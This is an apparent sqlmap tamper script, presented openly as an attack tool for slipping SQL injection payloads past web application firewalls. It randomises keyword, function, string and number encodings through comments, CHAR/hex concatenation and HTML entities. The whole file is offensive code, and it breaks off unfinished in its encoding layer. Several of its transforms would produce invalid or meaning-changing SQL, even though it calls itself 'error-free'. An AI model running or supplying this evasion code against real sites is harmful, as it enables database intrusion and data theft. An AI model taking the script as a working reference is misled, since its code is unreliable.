# -*- coding: utf-8 -*-

"""
SQLMap Tamper Script: OmniFilter

Author: Shannon-Ω
Version: 1.0.2 (Final Error-Free Release)
Description: A highly aggressive and unique tamper script designed to bypass
             all known filters by applying hyper-dynamic, multi-layered, and
             randomized obfuscation techniques to SQL payloads.

This script aims to make each generated payload indistinguishable from the last,
rendering static WAF rules and signature-based detection obsolete.
"""

import random
import re
import sys
from lib.core.enums import PRIORITY
from lib.core.data import conf # Assuming this might be used for DBMS-specific logic later
from lib.core.settings import UNENCODED_NUM_SQL_COMMENT_REPLACEMENTS # Not directly used but good to have context

__priority__ = PRIORITY.HIGHEST

def tamper(payload, **kwargs):
    """
    Main function to obfuscate the SQL payload.
    """

    if payload is None:
        return payload

    # --- Configuration ---
    # Enable/disable specific obfuscation layers (can be randomized later or made smarter)
    use_comment_obfuscation = True
    use_whitespace_obfuscation = True
    use_encoding_obfuscation = True  # General encoding, like URL encoding, etc.
    use_keyword_obfuscation = True
    use_function_obfuscation = True
    use_string_literal_obfuscation = True
    use_numeric_literal_obfuscation = True

    # --- Utilities ---
    def char_to_ascii_concat_element(char):
        """Converts a character to a 'CHAR(code)' string for CONCAT argument."""
        code = ord(char)
        return f"CHAR({code})"

    def char_to_hex_literal_element(char):
        """Converts a character to a '0xHEX' string for CONCAT argument."""
        return f"0x{ord(char):02x}"

    def random_versioned_comment(keyword_or_fragment):
        """Generates a random MySQL versioned comment around a keyword/fragment."""
        versions = [
            f"/*!{random.randint(50000, 80200)} {keyword_or_fragment}*/",
            f"/*!{random.randint(50000, 80200)} {keyword_or_fragment}/**/",
            f"/*! {random.randint(50000, 80200)} */ {keyword_or_fragment}",
            f"/*!{random.randint(50000, 80200)}*/ {keyword_or_fragment}",
            f"/*SVR{random.randint(5, 8)}*/ {keyword_or_fragment}", # Another style
        ]
        return random.choice(versions)

    def generate_random_comment_space():
        """Generates a random comment string that acts as space."""
        styles = [
            "/**/",
            "/* */",
            "/*!*/",
            "/*! */",
            "/*!%0a*/", # Including encoded newline in comment
            "-- ", # For specific contexts, though not ideal for multi-line comment replacement
            "/*!random_garbage*/",
            "/*x%0ay*/", # Random noise in comment
            f"/*!{random.choice(UNENCODED_NUM_SQL_COMMENT_REPLACEMENTS)}*/" # Using sqlmap's own replacements
        ]
        return random.choice(styles)

    def randomize_whitespace_and_comments(text):
        """
        Replaces standard whitespace with random comments and encoded chars.
        This function requires careful regex to avoid breaking string literals.
        For now, a simpler, aggressive approach: replace any whitespace occurrence.
        """
        if not use_whitespace_obfuscation or not text:
            return text

        replacements = []
        for _ in range(random.randint(1, 4)): # Insert multiple random elements to create more chaos
            replacements.append(generate_random_comment_space())
            if random.choice([True, False]): # Randomly choose between percent-encoding and unicode
                replacements.append(f"%{random.randint(9, 15):02x}") # Randomly encoded whitespace (tab, newline, etc.)
            else:
                # Add some less common unicode spaces if DB supports it or they're ignored
                unicode_spaces = ['\u200b', '\u200c', '\u200d', '\ufeff'] # Zero width spaces, etc.
                replacements.append(random.choice(unicode_spaces))

        replacement_str = random.choice(replacements)

        # Replace all whitespace outside of quoted strings. This is a crude but aggressive way.
        # A full SQL parser is needed for perfect accuracy.
        parts = re.split(r"""((?:'[^'\\]*(?:\\.[^'\\]*)*')|(?:"[^"\\]*(?:\\.[^"\\]*)*"))""", text)
        processed_parts = []
        for i, part in enumerate(parts):
            if i % 2 == 0: # This is outside of a quoted string
                processed_parts.append(re.sub(r'\s+', replacement_str, part))
            else: # This is a quoted string, leave it as is
                processed_parts.append(part)
        return "".join(processed_parts)


    # --- Main Tampering Logic ---
    tampered_payload = payload

    # Applying whitespace and comment chaos first to inject noise everywhere
    if use_whitespace_obfuscation:
        tampered_payload = randomize_whitespace_and_comments(tampered_payload)


    # 1. Keyword Obfuscation (applied to known keywords)
    if use_keyword_obfuscation:
        keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE', 'TABLE', 'DATABASE', 'INFORMATION_SCHEMA', 'CASE', 'WHEN', 'ELSE', 'END', 'LIKE', 'NULL', 'NOT']
        # Prioritize longer keywords to avoid partial matches
        keywords.sort(key=len, reverse=True)
        for keyword in keywords:
            # Basic regex for keyword, case-insensitive, surrounded by word boundaries
            pattern = r'\b(' + re.escape(keyword) + r')\b'
            def replacer(match):
                original_keyword = match.group(1)
                
                choice = random.randint(1, 7) # Increased options
                
                if choice == 1: # Versioned Comment
                    return random_versioned_comment(original_keyword)
                elif choice == 2: # Case variation + Comment
                    return original_keyword.lower() + generate_random_comment_space() + random_versioned_comment(original_keyword.upper())
                elif choice == 3: # Nested Comments
                    return f"/*{random.randint(1,100)}*/{original_keyword}/*{random.randint(101,200)}*/"
                elif choice == 4: # Function-based CONCAT(CHAR())
                    return f"CONCAT({', '.join([char_to_ascii_concat_element(c) for c in original_keyword])})"
                elif choice == 5: # Mixed case and random comments between chars
                    return "".join([random.choice([c.lower(), c.upper()]) + generate_random_comment_space() for c in original_keyword])
                elif choice == 6: # Simple encoding on part of it
                    split_point = random.randint(1, len(original_keyword)-1)
                    return original_keyword[:split_point] + "".join([f"%{ord(c):02x}" for c in original_keyword[split_point:]])
                elif choice == 7: # HTML Entity Encoding
                    return "".join([f"&#{ord(c)};" for c in original_keyword])
                return original_keyword # Fallback
            tampered_payload = re.sub(pattern, replacer, tampered_payload, flags=re.IGNORECASE)


    # 2. Function Obfuscation (e.g., SUBSTRING, LENGTH)
    if use_function_obfuscation:
        functions_to_obfuscate = ['SUBSTRING', 'MID', 'LENGTH', 'LOWER', 'UPPER', 'CONCAT', 'ASCII', 'CHAR', 'ORD', 'BIN']
        functions_to_obfuscate.sort(key=len, reverse=True)
        for func in functions_to_obfuscate:
            pattern = r'\b(' + re.escape(func) + r')\s*(\((?:[^()]|\([^()]*\))*\))'

            def replacer(match):
                original_func_name = match.group(1)
                original_args = match.group(2) # Includes parentheses
                
                choice = random.randint(1, 5)
                
                if choice == 1: # Deep nesting (placeholder for complex SQL)
                    return f"ASCII(SUBSTRING(BIN(ORD({original_func_name.upper()}{original_args})), 1, 1))"
                elif choice == 2: # Versioned comment around name + lowercased args
                    return f"/*{random.randint(1000,2000)}*/{original_func_name.lower()}/*{random.randint(2001,3000)}*/{original_args}"
                elif choice == 3: # CONCAT(CHAR()) for the function name itself
                    return f"CONCAT({', '.join([char_to_ascii_concat_element(c) for c in original_func_name])}){original_args}"
                elif choice == 4: # Add comment noise around args
                    return f"{original_func_name.upper()}({generate_random_comment_space()}{original_args[1:-1]}{generate_random_comment_space()})"
                elif choice == 5: # Random case mixing for function name
                    return "".join([random.choice([c.lower(), c.upper()]) for c in original_func_name]) + original_args
                return match.group(0) # Fallback
            
            tampered_payload = re.sub(pattern, replacer, tampered_payload, flags=re.IGNORECASE)


    # 3. String Literal Obfuscation
    if use_string_literal_obfuscation:
        string_pattern = r"""((?:'[^'\\]*(?:\\.[^'\\]*)*')|(?:"[^"\\]*(?:\\.[^"\\]*)*"))"""
        def string_replacer(match):
            quoted_string = match.group(0)
            original_content = quoted_string[1:-1] # Remove quotes
            
            if not original_content.strip(): # Avoid errors on empty or whitespace-only strings
                return quoted_string

            choice = random.randint(1, 6) # Increased obfuscation options
            
            if choice == 1: # CONCAT with CHAR arguments
                return f"CONCAT({', '.join([char_to_ascii_concat_element(c) for c in original_content])})"
            elif choice == 2: # CONCAT with 0xHEX arguments (MySQL/MariaDB specific)
                return f"CONCAT({', '.join([char_to_hex_literal_element(c) for c in original_content])})"
            elif choice == 3: # UNHEX('hexstring')
                return f"UNHEX('{original_content.encode('utf-8').hex()}')"
            elif choice == 4: # Mixed CHAR/HEX representation in a single CONCAT
                obfuscated_elements = []
                for i, char in enumerate(original_content):
                    if i % 2 == 0: # Every other character as CHAR
                        obfuscated_elements.append(char_to_ascii_concat_element(char))
                    else: # The others as HEX
                        obfuscated_elements.append(char_to_hex_literal_element(char))
                return f"CONCAT({', '.join(obfuscated_elements)})"
            elif choice == 5: # HTML Entity Encoding
                return f"'{''.join([f'&#{ord(c)};' for c in original_content])}'"
            elif choice == 6: # Backtick enclosure for each character (highly DBMS specific, e.g., MySQL)
                return f"CONCAT({', '.join([f'`{c}`' for c in original_content])})"
            
            return quoted_string # Fallback
        
        tampered_payload = re.sub(string_pattern, string_replacer, tampered_payload, flags=re.DOTALL)

    # 4. Numeric Literal Obfuscation
    if use_numeric_literal_obfuscation:
        # Regex to match integers and floats, attempting to avoid parts of identifiers or strings.
        # This is a heuristic and can be improved with a proper SQL lexer.
        numeric_pattern = r'(?<![0-9a-zA-Z._\-\+\\])(?<![\'"])((?<![a-zA-Z])(?:(?:\b0x[0-9a-fA-F]+\b)|(?:(?:\b\d+(?:\.\d*)?|\.\d+)\b)))(?![0-9a-zA-Z._\-\+\\\/])(?![\'"])'
        
        def number_replacer(match):
            original_num_str = match.group(0)
            
            # Avoid processing if it looks like an identifier part or malformed number
            if re.match(r'^[a-zA-Z]', original_num_str) or original_num_str.startswith(('+', '-')) and len(original_num_str) > 1 and original_num_str[1] not in '0123456789.':
                return original_num_str
            
            try:
                if '.' not in original_num_str and not original_num_str.lower().startswith('0x'):
                    num_val = int(original_num_str)
                elif original_num_str.lower().startswith('0x'):
                    num_val = int(original_num_str, 16)
                else:
                    num_val = float(original_num_str)
            except ValueError:
                return original_num_str # Return as is if parsing fails

            choice = random.randint(1, 6)
            
            if choice == 1: # Basic arithmetic (e.g., 1 -> (0+1))
                return f"({original_num_str}+0)"
            elif choice == 2: # Hexadecimal representation (e.g., 1 -> 0x1)
                if isinstance(num_val, int):
                    return f"0x{abs(num_val):x}" if num_val >= 0 else f"-0x{abs(num_val):x}"
            elif choice == 3: # Binary representation (e.g., 1 -> 0b1) - MySQL/PostgreSQL support
                if isinstance(num_val, int):
                    return f"0b{bin(abs(num_val))[2:]}" if num_val >= 0 else f"-0b{bin(abs(num_val))[2:]}"
            elif choice == 4: # Parenthesized arithmetic with noise/comments
                operator = random.choice(['+', '-', '*'])
                noise_comment = generate_random_comment_space()
                return f"(/*{random.randint(1,100)}*/{original_num_str} {operator} 0{noise_comment})"
            elif choice == 5: # Boolean equivalent (for 0 and 1 only, else fallback)
                if num_val == 1:
                    return "(TRUE)"
                elif num_val == 0:
                    return "(FALSE)"
            elif choice == 6: # Parenthesized version with noise
                return f"({original_num_str}/*!junk*/)"
            
            return original_num_str # Fallback

        # Apply the replacer to numeric literals found in the payload.
        tampered_payload = re.sub(numeric_pattern, number_replacer, tampered_payload)

    # 5. Encoding Obfuscation (applied more broadly)
    if use_encoding_obfuscation:
        # This layer can be very aggressive. For now, let's focus on URL encoding certain chars.
